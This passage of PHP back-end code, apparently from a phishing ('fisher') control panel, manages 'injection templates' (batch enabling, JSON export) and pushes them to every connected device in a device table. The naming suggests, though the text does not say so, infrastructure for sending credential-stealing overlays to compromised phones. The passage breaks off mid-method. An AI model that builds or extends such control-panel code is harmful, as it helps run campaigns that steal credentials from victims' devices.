    // ================= injections =================
    protected function injections(array $seg)
    {
        $sub = (string)($seg[1] ?? '');
        if ($sub === 'batch' && $this->method === 'POST') {
            $ids = $this->body['ids'] ?? [];
            $act = (string)($this->body['action'] ?? 'enable');
            if (is_array($ids) && $ids) {
                $val = in_array($act, ['enable', 'on', 'show'], true) ? 1 : 0;
                Db::table('fisher_injection_templates')->whereIn('id', array_map('intval', $ids))->update(['enabled' => $val]);
            }
            return $this->json(['success' => true, 'data' => null, 'count' => is_array($ids) ? count($ids) : 0]);
        }
        if ($sub === 'export') {
            $rows = Db::table('fisher_injection_templates')->order('id', 'asc')->select()->toArray();
            $out = array_map([$this, 'injRow'], $rows);
            $json = json_encode($out, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
            return response($json, 200, [
                'Content-Type' => 'application/json; charset=utf-8',
                'Content-Disposition' => 'attachment; filename="injection_templates.json"',
            ]);
        }
        if ($sub === 'push' && $this->method === 'POST') {
            $ids = $this->body['ids'] ?? [];
            $deviceIds = $this->body['device_ids'] ?? [];
            if (!is_array($deviceIds) || !$deviceIds) {
                $deviceIds = Db::table('fisher_devices')->where('is_connected', 1)->column('device_id');
            }
            $sent = 0;
            foreach ((array)$deviceIds as $did) {
                $this->notifyWs((string)$did, 'PUSH_INJECTION', ['ids' => $ids]);
                $sent++;
            }
            return $this->json(['success' => true, 'message' => '已推送 ' . $sent . ' 台设备', 'data' => ['sent' => $sent]]);
        }
        if ($this->method === 'POST') {
